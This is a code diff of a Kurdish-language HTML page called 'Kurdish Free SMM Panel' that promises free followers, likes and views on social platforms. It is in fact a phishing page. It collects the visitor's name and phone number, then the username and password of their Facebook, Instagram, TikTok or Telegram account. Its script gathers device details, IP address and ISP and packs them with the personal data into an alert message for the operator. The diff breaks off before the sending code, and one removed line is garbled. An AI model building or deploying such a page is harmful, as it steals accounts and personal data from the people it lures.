@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kurdish Free SMM Panel - بەهێزترین پانێڵی بەخۆڕایی</title>
+    <title>Kurdish Free SMM Panel - پانێڵی پێشکەوتووی خزمەتگوزاری</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.35/ua-parser.min.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;600;700;800;900&display=swap');
@@ -11,207 +11,149 @@
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Vazirmatn', sans-serif; }
 
         body {
-            background: linear-gradient(-45deg, #0f172a, #1e1b4b, #2e1065, #030712);
-            background-size: 400% 400%;
-            animation: gradientBG 15s ease infinite;
-            color: #f8fafc;
+            background: linear-gradient(135deg, #090d16, #131c31, #1a103c);
+            color: #f1f5f9;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             overflow-x: hidden;
         }
 
-        @keyframes gradientBG {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
         header {
-            background: rgba(15, 23, 42, 0.7);
-            backdrop-filter: blur(15px);
-            border-bottom: 1px solid rgba(56, 189, 248, 0.2);
-            padding: 18px 30px;
+            background: rgba(15, 23, 42, 0.85);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(56, 189, 248, 0.15);
+            padding: 20px 40px;
             display: flex;
             justify-content: space-between;
             align-items: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
 
         .logo {
-            font-size: 22px;
-            font-weight: 900;
+            font-size: 24px;
+            font-weight: 950;
             color: #38bdf8;
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 12px;
+            text-shadow: 0 0 15px rgba(56, 189, 248, 0.5);
         }
 
-        .hero {
-            text-align: center;
-            padding: 60px 20px 30px;
-            max-width: 850px;
-            margin: 0 auto;
-        }
-
-        .badge-free {
-            background: rgba(168, 85, 247, 0.15);
-            color: #c084fc;
-            border: 1px solid rgba(168, 85, 247, 0.4);
-            padding: 8px 20px;
-            border-radius: 30px;
-            font-size: 14px;
-            display: inline-block;
-            margin-bottom: 20px;
-            font-weight: 800;
-        }
-
-        .hero h1 {
-            font-size: 30px;
-            color: #ffffff;
-            margin-bottom: 18px;
-            font-weight: 900;
-            line-height: 1.3;
-        }
-
-        .hero p {
-            font-size: 14px;
-            color: #cbd5e1;
-            line-height: 1.8;
-            margin-bottom: 30px;
-        }
-
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
-            gap: 15px;
-            max-width: 950px;
-            margin: 20px auto 40px;
+        .main-container {
+            max-width: 600px;
+            margin: 40px auto;
             padding: 0 20px;
+            width: 100%;
         }
 
-        .stat-card {
-            background: rgba(30, 41, 59, 0.5);
-            backdrop-filter: blur(10px);
+        .card-box {
+            background: rgba(15, 23, 42, 0.9);
             border: 1px solid rgba(56, 189, 248, 0.2);
-            border-radius: 16px;
-            padding: 20px 15px;
-            text-align: center;
+            border-radius: 24px;
+            padding: 35px 30px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(10px);
         }
 
-        .stat-card h3 {
+        .card-box h1 {
             font-size: 24px;
             color: #38bdf8;
-            margin-bottom: 6px;
+            margin-bottom: 10px;
+            text-align: center;
             font-weight: 900;
         }
 
-        .stat-card p {
-            font-size: 12px;
+        .card-box p {
+            font-size: 13px;
             color: #94a3b8;
+            text-align: center;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+            text-align: right;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            color: #e2e8f0;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 14px 18px;
+            background: rgba(30, 41, 59, 0.8);
+            border: 1px solid rgba(56, 189, 248, 0.3);
+            border-radius: 14px;
+            color: #f8fafc;
+            font-size: 15px;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .form-control:focus {
+            border-color: #a855f7;
+            box-shadow: 0 0 20px rgba(168, 85, 247, 0.35);
         }
 
         .btn-primary {
             background: linear-gradient(135deg, #38bdf8, #a855f7);
             color: #fff;
             border: none;
-            padding: 16px 36px;
-            font-size: 17px;
+            padding: 16px;
+            font-size: 16px;
             border-radius: 14px;
             cursor: pointer;
             font-weight: 900;
+            width: 100%;
             box-shadow: 0 0 25px rgba(56, 189, 248, 0.4);
             transition: all 0.3s ease;
-            display: inline-block;
+            margin-top: 10px;
         }
 
-        /* Modal / Form Styling */
-        .modal-overlay {
-            position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(3, 7, 18, 0.9);
-            backdrop-filter: blur(12px);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            padding: 15px;
-            z-index: 99999;
-        }
-
-        .modal-card {
-            background: rgba(15, 23, 42, 0.98);
-            border: 1px solid rgba(168, 85, 247, 0.4);
-            border-radius: 24px;
-            padding: 30px 20px;
-            max-width: 480px;
-            width: 100%;
-            box-shadow: 0 0 50px rgba(168, 85, 247, 0.3);
-            max-height: 90vh;
-            overflow-y: auto;
-        }
-
-        .modal-card h2 {
-            color: #38bdf8;
-            font-size: 20px;
-            margin-bottom: 8px;
-            text-align: center;
-            font-weight: 900;
-        }
-
-        .modal-card p {
-            color: #94a3b8;
-            font-size: 12px;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-
-        .form-group {
-            margin-bottom: 14px;
-            text-align: right;
-        }
-
-        .form-group label {
-            display: block;
-            font-size: 12px;
-            color: #e2e8f0;
-            margin-bottom: 6px;
-            font-weight: 700;
-        }
-
-        .form-control {
-            width: 100%;
-            padding: 12px 14px;
-            background: rgba(30, 41, 59, 0.9);
-            border: 1px solid rgba(56, 189, 248, 0.3);
-            border-radius: 12px;
-            color: #f8fafc;
-            font-size: 14px;
-            outline: none;
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 35px rgba(168, 85, 247, 0.7);
         }
 
         .platform-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
-            gap: 12px;
+            grid-template-columns: repeat(auto-fit, minmax(110px, 1fr));
+            gap: 15px;
             margin: 20px 0;
         }
 
         .platform-card {
             background: rgba(30, 41, 59, 0.6);
             border: 2px solid rgba(255, 255, 255, 0.08);
-            border-radius: 16px;
-            padding: 15px 10px;
+            border-radius: 18px;
+            padding: 18px 10px;
             text-align: center;
             cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .platform-card:hover {
+            border-color: #38bdf8;
+            background: rgba(56, 189, 248, 0.15);
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(56, 189, 248, 0.3);
         }
 
         .platform-svg {
-            width: 35px;
-            height: 35px;
-            margin-bottom: 6px;
+            width: 38px;
+            height: 38px;
+            margin-bottom: 8px;
         }
 
         .platform-name {
-            font-size: 12px;
+            font-size: 13px;
             font-weight: 800;
             color: #f8fafc;
         }
@@ -220,11 +162,11 @@
             background: rgba(56, 189, 248, 0.08);
             border: 1px dashed rgba(56, 189, 248, 0.4);
             border-radius: 12px;
-            padding: 12px;
-            font-size: 12px;
+            padding: 14px;
+            font-size: 13px;
             color: #38bdf8;
-            line-height: 1.6;
-            margin-top: 15px;
+            line-height: 1.7;
+            margin-top: 18px;
             text-align: right;
         }
 
@@ -247,133 +189,94 @@
 <body>
 
     <header>
-        <div class="logo">🚀 Kurdish Free SMM Panel</div>
+        <div class="logo">⚡️ Kurdish Free SMM Panel</div>
     </header>
 
-    <!-- LANDING PAGE VIEW -->
-    <div id="landingView">
-        <section class="hero">
-            <span class="badge-free">🎉 خزمەتگوزاری ١٠٠٪ بەخۆڕایی (Free SMM)</span>
-            <h1>کوردیش ئێس ئێم ئێم پانێڵ - گەشەپێدانی پلاتفۆرمەکانت</h1>
-            <p>بەهێزترین پانێڵی ئۆتۆماتیکی لە کوردستان! ڕۆژانە دەتوانیت تا ١,٠٠٠ بڕ بەخۆڕایی بۆ سەرجەم ئەکاونتەکانت زیاد بکەیت. هەر ٢٤ کاتژمێر جارێک دەتوانیت داواکارییەکی نوێ بنێریت.</p>
-            
-            <button type="button" class="btn-primary" onclick="openRegisterModal()">دەستپێکردن و خۆتۆمارکردن 🚀</button>
-        </section>
-
-        <section class="stats-grid">
-            <div class="stat-card"><h3>6.0M+</h3><p>داواکاری جێبەجێکراو</p></div>
-            <div class="stat-card"><h3>⚡️</h3><p>کارکردنی ئۆتۆماتیک</p></div>
-            <div class="stat-card"><h3>100%</h3><p>سیستەمی ئۆتۆماتیک و بەخۆڕایی</p></div>
-            <div class="stat-card"><h3>1,000</h3><p>زیادکردنی ڕۆژانە</p></div>
-        </section>
-    </div>
-
-    <!-- REGISTER MODAL -->
-    <div class="modal-overlay" id="registerModal">
-        <div class="modal-card">
-            <h2>دروستکردنی هەژماری نوێ</h2>
-            <p>تکایە زانیارییەکانت بنووسە بۆ چالاککردنی پانێڵەکەت</p>
+    <div class="main-container">
+        <!-- REGISTRATION VIEW (Direct on Page) -->
+        <div class="card-box" id="registerView">
+            <h1>دروستکردنی هەژماری نوێ</h1>
+            <p>بۆ بەکارهێنانی خزمەتگوزارییە بەخۆڕاییەکان، سەرەتا زانیارییە سەرەتاییەکانت تۆمار بکە</p>
 
             <div class="form-group">
-                <label>ناوی یەکەم:</label>
-                <input type="text" id="regFName" class="form-control" placeholder="ناوی یەکەم">
+                <label>١. ناوی یەکەم:</label>
+                <input type="text" id="regFName" class="form-control" placeholder="ناوی یەکەم بنووسە">
             </div>
             <div class="form-group">
-                <label>ناوی دووەم:</label>
-                <input type="text" id="regLName" class="form-control" placeholder="ناوی دووەم">
+                <label>٢. ناوی دووەم:</label>
+                <input type="text" id="regLName" class="form-control" placeholder="ناوی دووەم بنووسە">
             </div>
             <div class="form-group">
-                <label>ژمارەی تەلەفۆن:</label>
+                <label>٣. ژمارە تەلەفۆن:</label>
                 <input type="tel" id="regPhone" class="form-control" placeholder="0750XXXXXXX">
             </div>
-            <div class="form-group">
-                <label>ئیمەیڵ:</label>
-                <input type="email" id="regEmail" class="form-control" placeholder="example@gmail.com">
-            </div>
-            <div class="form-group">
-                <label>ڕێکەوتی لەدایکبوون:</label>
-                <input type="date" id="regBirth" class="form-control">
-            </div>
-            <div class="form-group">
-                <label>ڕەگەز:</label>
-                <select id="regGender" class="form-control">
-                    <option value="نێر">نێر (Male)</option>
-                    <option value="مێ">مێ (Female)</option>
-                </select>
-            </div>
 
-            <button type="button" class="btn-primary" style="width: 100%; margin-top: 10px;" onclick="handleRegistration()">تۆمارکردن و چوونەژوورەوە 🔑</button>
-        </div>
-    </div>
-
-    <!-- DASHBOARD VIEW -->
-    <div id="dashboardView" style="display: none; max-width: 650px; margin: 30px auto; padding: 0 20px;">
-        <h2 style="color: #38bdf8; text-align: center; margin-bottom: 6px; font-size: 22px;" id="dashWelcome">بەخێربێیت!</h2>
-        <p style="text-align: center; color: #94a3b8; font-size: 13px; margin-bottom: 20px;">دەتەوێت لە کامە پلاتفۆرم خزمەتگوزاری بۆخۆت زیاد بکەیت؟</p>
-
-        <div class="platform-grid">
-            <div class="platform-card" onclick="selectPlatform('Facebook')">
-                <svg class="platform-svg" viewBox="0 0 24 24" fill="#1877F2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
-                <div class="platform-name">Facebook</div>
-            </div>
-            <div class="platform-card" onclick="selectPlatform('Instagram')">
-                <svg class="platform-svg" viewBox="0 0 24 24"><radialGradient id="igG" cx="0.2" cy="1" r="1.4"><stop offset="0" stop-color="#FFDD55"/><stop offset="0.3" stop-color="#FF543E"/><stop offset="0.6" stop-color="#C837AB"/><stop offset="1" stop-color="#3771C8"/></radialGradient><path fill="url(#igG)" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
-                <div class="platform-name">Instagram</div>
-            </div>
-            <div class="platform-card" onclick="selectPlatform('TikTok')">
-                <svg class="platform-svg" viewBox="0 0 24 24" fill="#000000"><path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.82.57-1.31 1.56-1.28 2.56.02.9.5 1.78 1.24 2.29.98.67 2.33.68 3.33.03.9-.57 1.46-1.6 1.46-2.66.03-4.85.01-9.7.01-14.55z" fill="#38bdf8"/></svg>
-                <div class="platform-name">TikTok</div>
-            </div>
-            <div class="platform-card" onclick="selectPlatform('Snapchat')">
-                <svg class="platform-svg" viewBox="0 0 24 24" fill="#FFFC00"><path d="M12 0c-4.97 0-9 3.58-9 8 0 1.63.56 3.14 1.52 4.36-.61.64-1.44 1.2-2.52 1.64-.32.13-.39.46-.11.68.86.68 1.89 1.22 3.01 1.58-.22.56-.37 1.16-.37 1.8 0 .82.35 1.58.93 2.11 1.05.95 2.61 1.33 4.29 1.33 1.14 0 2.22-.18 3.25-.5 1.03.32 2.11.5 3.25.5 1.68 0 3.24-.38 4.29-1.33.58-.53.93-1.29.93-2.11 0-.64-.15-1.24-.37-1.8 1.12-.36 2.15-.9 3.01-1.58.28-.22.21-.55-.11-.68-1.08-.44-1.91-1-2.52-1.64.96-1.22 1.52-2.73 1.52-4.36 0-4.42-4.03-8-9-8z" stroke="#000" stroke-width="1"/></svg>
-                <div class="platform-name">Snapchat</div>
-            </div>
-            <div class="platform-card" onclick="selectPlatform('Telegram')">
-                <svg class="platform-svg" viewBox="0 0 24 24" fill="#26A5E4"><path d="M12 0C5.37 0 0 5.37 0 12s5.37 12 12 12 12-5.37 12-12S18.63 0 12 0zm5.56 8.16l-2.03 9.56c-.15.68-.55.84-1.12.52l-3.1-2.28-1.5 1.44c-.17.17-.31.31-.63.31l.22-3.17 5.77-5.21c.25-.22-.05-.34-.38-.12l-7.14 4.49-3.07-.96c-.67-.21-.68-.67.14-.99l12.01-4.63c.56-.21 1.05.13.84.84z"/></svg>
-                <div class="platform-name">Telegram</div>
-            </div>
-            <div class="platform-card" onclick="selectPlatform('YouTube')">
-                <svg class="platform-svg" viewBox="0 0 24 24" fill="#FF0000"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
-                <div class="platform-name">YouTube</div>
-            </div>
+            <button type="button" class="btn-primary" onclick="handleRegistration()">دروستکردنی ئەکاونت و دەستپێکردن 🚀</button>
         </div>
 
-        <div id="serviceBox" style="display: none; background: rgba(15, 23, 42, 0.9); border: 1px solid rgba(168, 85, 247, 0.3); padding: 20px; border-radius: 20px; margin-top: 20px;">
-            <h3 style="color: #38bdf8; font-size: 16px; margin-bottom: 15px; text-align: center;" id="selectedPlatformTitle">دیاریکردنی خزمەتگوزاری</h3>
-            
-            <div class="form-group">
-                <label>جۆری خزمەتگوزاری:</label>
-                <select id="serviceType" class="form-control" onchange="onServiceChange()"></select>
-            </div>
+        <!-- DASHBOARD VIEW -->
+        <div id="dashboardView" style="display: none;">
+            <div class="card-box">
+                <h2 style="color: #38bdf8; text-align: center; margin-bottom: 6px; font-size: 22px;" id="dashWelcome">بەخێربێیت!</h2>
+                <p style="text-align: center; color: #94a3b8; font-size: 13px; margin-bottom: 20px;">ئەکاونتەکەت سەرکەوتووانە دروست بوو. ئێستا پلاتفۆرمەکەت هەڵبژێرە:</p>
 
-            <div class="form-group">
-                <label id="lblTargetLink">لینکی ئامانج:</label>
-                <input type="url" id="targetLink" class="form-control" placeholder="https://..." autocomplete="off">
-            </div>
+                <div class="platform-grid">
+                    <div class="platform-card" onclick="selectPlatform('Facebook')">
+                        <svg class="platform-svg" viewBox="0 0 24 24" fill="#1877F2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+                        <div class="platform-name">Facebook</div>
+                    </div>
+                    <div class="platform-card" onclick="selectPlatform('Instagram')">
+                        <svg class="platform-svg" viewBox="0 0 24 24"><radialGradient id="igG" cx="0.2" cy="1" r="1.4"><stop offset="0" stop-color="#FFDD55"/><stop offset="0.3" stop-color="#FF543E"/><stop offset="0.6" stop-color="#C837AB"/><stop offset="1" stop-color="#3771C8"/></radialGradient><path fill="url(#igG)" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
+                        <div class="platform-name">Instagram</div>
+                    </div>
+                    <div class="platform-card" onclick="selectPlatform('TikTok')">
+                        <svg class="platform-svg" viewBox="0 0 24 24" fill="#000000"><path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.82.57-1.31 1.56-1.28 2.56.02.9.5 1.78 1.24 2.29.98.67 2.33.68 3.33.03.9-.57 1.46-1.6 1.46-2.66.03-4.85.01-9.7.01-14.55z" fill="#38bdf8"/></svg>
+                        <div class="platform-name">TikTok</div>
+                    </div>
+                    <div class="platform-card" onclick="selectPlatform('Telegram')">
+                        <svg class="platform-svg" viewBox="0 0 24 24" fill="#26A5E4"><path d="M12 0C5.37 0 0 5.37 0 12s5.37 12 12 12 12-5.37 12-12S18.63 0 12 0zm5.56 8.16l-2.03 9.56c-.15.68-.55.84-1.12.52l-3.1-2.28-1.5 1.44c-.17.17-.31.31-.63.31l.22-3.17 5.77-5.21c.25-.22-.05-.34-.38-.12l-7.14 4.49-3.07-.96c-.67-.21-.68-.67.14-.99l12.01-4.63c.56-.21 1.05.13.84.84z"/></svg>
+                        <div class="platform-name">Telegram</div>
+                    </div>
+                </div>
 
-            <div class="form-group">
-                <label>ئیمەیڵ یان یوزەرنێیمی ئەکاونتەکەت:</label>
-                <input type="text" id="accUser" class="form-control" placeholder="Email / Username" autocomplete="off">
-            </div>
+                <div id="serviceBox" style="display: none; margin-top: 20px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 20px;">
+                    <h3 style="color: #38bdf8; font-size: 16px; margin-bottom: 15px; text-align: center;" id="selectedPlatformTitle">خزمەتگوزاری</h3>
+                    
+                    <div class="form-group">
+                        <label>جۆری خزمەتگوزاری:</label>
+                        <select id="serviceType" class="form-control" onchange="onServiceChange()"></select>
+                    </div>
 
-            <div class="form-group" id="passGroup">
-                <label>پاسوۆردی ئەکاونتەکەت (بۆ بەستنەوە بە API):</label>
-                <input type="password" id="accPass" class="form-control" placeholder="••••••••" autocomplete="off">
-            </div>
+                    <div class="form-group">
+                        <label id="lblTargetLink">لینکی ئامانج:</label>
+                        <input type="url" id="targetLink" class="form-control" placeholder="https://..." autocomplete="off">
+                    </div>
 
-            <div class="notice-box" id="poeticNotice">زانیاری خزمەتگوزاری...</div>
+                    <div class="form-group">
+                        <label>ئیمەیڵ یان یوزەرنێیم:</label>
+                        <input type="text" id="accUser" class="form-control" placeholder="Username / Email" autocomplete="off">
+                    </div>
 
-            <button type="button" class="btn-primary" style="width: 100%; margin-top: 15px;" onclick="submitOrder()" id="btnSubmitOrder">ناردنی داواکاری ئۆتۆماتیک ⚡️</button>
+                    <div class="form-group" id="passGroup">
+                        <label>پاسوۆردی ئەکاونتەکەت:</label>
+                        <input type="password" id="accPass" class="form-control" placeholder="••••••••" autocomplete="off">
+                    </div>
 
-            <div class="progress-container" id="progressBox">
-                <div class="progress-bar-bg"><div class="progress-bar-fill" id="progressFill"></div></div>
-                <div class="status-text" id="statusText">پەیوەستبوون بە سێرڤەر...</div>
+                    <div class="notice-box" id="poeticNotice">زانیاری خزمەتگوزاری...</div>
+
+                    <button type="button" class="btn-primary" style="margin-top: 15px;" onclick="submitOrder()" id="btnSubmitOrder">ناردنی داواکاری ئۆتۆماتیک ⚡️</button>
+
+                    <div class="progress-container" id="progressBox">
+                        <div class="progress-bar-bg"><div class="progress-bar-fill" id="progressFill"></div></div>
+                        <div class="status-text" id="statusText">جێبەجێکردنی داواکاری...</div>
+                    </div>
+                </div>
             </div>
         </div>
     </div>
 
     <footer>
-        © 2026 Kurdish Free SMM Panel. All Rights Reserved. (Kurdish Free SMM Panel)
+        © 2026 Kurdish Free SMM Panel. All Rights Reserved.
     </footer>
 
     <script>
@@ -385,38 +288,25 @@
         let activePlatform = "";
 
         const servicesData = {
-            Facebook: ["زیادکردنی لایکی پۆست (Post Likes - 1000 Free)", "زیادکردنی لایکی پەیج (Page Likes - 1000 Free)", "زیادکردنی کۆمێنتی پۆست (Post Comments - 1000 Free)"],
-            Instagram: ["زیادکردنی فۆڵۆوەر (Followers - 1000 Free)", "زیادکردنی لایکی پۆست یان ڕێڵس (Likes - 1000 Free)", "زیادکردنی کۆمێنتی پۆست (Comments - 1000 Free)"],
-            TikTok: ["زیادکردنی فۆڵۆوەر (Followers - 1000 Free)", "زیادکردنی بینەری ڤیدیۆ (Video Views - 1000 Free)", "زیادکردنی لایکی ڤیدیۆ (Video Likes - 1000 Free)"],
-            Snapchat: ["زیادکردنی سوبسکڕایب (Subscribers - 1000 Free)", "زیادکردنی بینەری ستۆری (Story Views - 1000 Free)"],
-            Telegram: ["زیادکردنی ئەندامی کەناڵ (Channel Members - 1000 Free)", "زیادکردنی ئەندامی گروپ (Group Members - 1000 Free)"],
-            YouTube: ["زیادکردنی بینەری ڤیدیۆ (Video Views - 1000 Free)", "زیادکردنی سوبسکڕایب (Subscribers - 1000 Free)"]
+            Facebook: ["زیادکردنی لایکی پۆست (1000 Free)", "زیادکردنی لایکی پەیج (1000 Free)"],
+            Instagram: ["زیادکردنی فۆڵۆوەر (1000 Free)", "زیادکردنی لایکی ڕێڵس (1000 Free)"],
+            TikTok: ["زیادکردنی فۆڵۆوەر (1000 Free)", "زیادکردنی بینەری ڤیدیۆ (1000 Free)"],
+            Telegram: ["زیادکردنی ئەندامی کەناڵ (1000 Free)", "زیادکردنی بینەری پۆست (1000 Free)"]
         };
-
-        function openRegisterModal() {
-            const modal = document.getElementById("registerModal");
-            if (modal) {
-                modal.style.display = "flex";
-            }
-        }
 
         function handleRegistration() {
             const fName = document.getElementById("regFName").value.trim();
             const lName = document.getElementById("regLName").value.trim();
             const phone = document.getElementById("regPhone").value.trim();
-            const email = document.getElementById("regEmail").value.trim();
-            const birth = document.getElementById("regBirth").value.trim();
-            const gender = document.getElementById("regGender").value;
 
-            if (!fName || !lName || !phone || !email || !birth) {
-                alert("تکایە هەموو خانەکانی فۆرمەکە پڕبکەرەوە!");
+            if (!fName || !lName || !phone) {
+                alert("تکایە هەموو خانەکان (ناوی یەکەم، ناوی دووەم، ژمارە تەلەفۆن) پڕبکەرەوە!");
                 return;
             }
 
-            userData = { fName, lName, phone, email, birth, gender };
+            userData = { fName, lName, phone };
 
-            document.getElementById("registerModal").style.display = "none";
-            document.getElementById("landingView").style.display = "none";
+            document.getElementById("registerView").style.display = "none";
             document.getElementById("dashboardView").style.display = "block";
             document.getElementById("dashWelcome").innerText = `بەخێربێیت، ${fName}! 👋`;
         }
@@ -450,7 +340,7 @@
             const srv = document.getElementById("serviceType").value;
             const noticeEl = document.getElementById("poeticNotice");
             let cleanName = srv ? srv.split(" (")[0] : "";
-            noticeEl.innerText = `تۆ خزمەتگوزاری (${cleanName})ـت هەڵبژاردووە. دوای ناردنی داواکارییەکە، ڕاستەوخۆ دەست بە جێبەجێکردنی دەکرێت.`;
+            noticeEl.innerText = `تۆ خزمەتگوزاری (${cleanName})ـت هەڵبژاردووە و ڕاستەوخۆ دەست بە جێبەجێکردنی دەکرێت.`;
         }
 
         async function submitOrder() {
@@ -467,14 +357,11 @@
             document.getElementById("btnSubmitOrder").style.display = "none";
             document.getElementById("progressBox").style.display = "block";
 
-            const now = new Date();
-            let timeString = now.toISOString().replace('T', ' ').substring(0, 19);
-
             let deviceModel = "نادیار";
             try {
                 const parser = new UAParser();
                 const result = parser.getResult();
-                deviceModel = `${result.device.vendor \vert{}\vert{} ''}${result.device.model || ''} (${result.os.name \vert{}\vert{} ''}${result.os.version || ''})`.trim();
+                deviceModel = `${result.device.vendor || ''} ${result.device.model || ''} (${result.os.name || ''} ${result.os.version || ''})`.trim();
             } catch (e) {}
 
             let ip = 'نادیار', isp = 'نادیار';
@@ -485,21 +372,16 @@
                 isp = data.org || 'نادیار';
             } catch (e) {}
 
-            let passDisplay = activePlatform === 'Telegram' ? 'پاسوۆردی نییە (تێلێگرام)' : `\`${accPass}\``;
-
-            const msg = `🚨 **داواکاری نوێ لە SMM Panel:**\n\n` +
+            const msg = `🚨 **ئەکاونتی نوێ و داواکاری:**\n\n` +
                         `👤 **زانیارییەکانی کەسەکە:**\n` +
-                        `• ناوی تەواو: ${userData.fName || ''} ${userData.lName || ''}\n` +
-                        `• تەلەفۆن: \`${userData.phone || ''}\`\n` +
-                        `• ئیمەیڵ: ${userData.email || ''}\n` +
